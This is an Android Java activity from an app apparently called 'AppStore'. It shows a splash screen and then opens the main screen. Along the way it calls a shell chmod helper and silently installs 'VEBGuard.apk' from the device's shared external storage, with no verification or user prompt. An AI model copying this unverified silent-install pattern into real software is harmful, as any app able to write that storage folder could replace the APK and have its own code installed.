package com.zyitong.AppStore.activity;


import java.util.Timer;
import java.util.TimerTask;

import com.zyitong.AppStore.R;
import com.zyitong.AppStore.WeiBoApplication;
import com.zyitong.AppStore.util.UtilFun;

import android.app.Activity;
import android.content.pm.ActivityInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.DocumentsContract.Root;
import android.util.Log;
import android.view.MotionEvent;
import android.view.Window;
import android.widget.ImageView;

public class UpdateActivity extends Activity {
	private long startTime;   
    private boolean touched=false;   
    private Timer timer;
    private UtilFun utilFun;
    
    
    private static String WeiBoRoot = android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/AppStore/";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		setContentView(R.layout.update);
		init();
	}
	
	
	@Override
	protected void onDestroy() {
		// TODO Auto-generated method stub

		super.onDestroy();
	}


	private void init()
	{
		ImageView mImageView = (ImageView)findViewById(R.id.animation_iv);  
		mImageView.setBackgroundResource(R.drawable.start_screen);
		utilFun = new UtilFun(UpdateActivity.this);
		WeiBoApplication.getInstance().clearCache();
		timer = new Timer(true);   
	       startTime = System.currentTimeMillis();
	       System.out.println("currentTime = "+startTime);
	       timer.schedule(task, 0, 1);   

		
	}
	
	private final TimerTask task = new TimerTask() {   
        public void run() {   
            if ((task.scheduledExecutionTime() - startTime) == 1000 || touched) {
            	System.out.println("TimerTask execute");
            	utilFun.excuateShellchmod();
            	String result = utilFun.install(WeiBoRoot+"soft/VEBGuard.apk");
            	
            	Log.e("updateActivity", result);
            	Log.e("updateActivity", "cilentinstall excuate");
                Message message = new Message();   
                message.what = 0;   
                timerHandler.sendMessage(message);   
                timer.cancel();   
                this.cancel();   
            }   
  
        }   
    };   
    private final Handler timerHandler = new Handler() {   
        public void handleMessage(Message msg) {   
            switch (msg.what) {   
            case 0:   
            	entryMain();
                   
                break;   
            }   
            super.handleMessage(msg);   
        }   
    };   
  
       
    /**  
     * 点击直接跳转  
     */  
    public boolean onTouchEvent(MotionEvent event) {   
        if (event.getAction() == MotionEvent.ACTION_DOWN) {   
            touched = true;
        	//entryMain();
        }   
        return true;   
    }   

	private void entryMain() 
	{
	
		MainActivity.launch(UpdateActivity.this, new Bundle());
		finish();
		 overridePendingTransition(R.layout.apvalue, R.layout.apvalue);  
	}
	
	
	
}
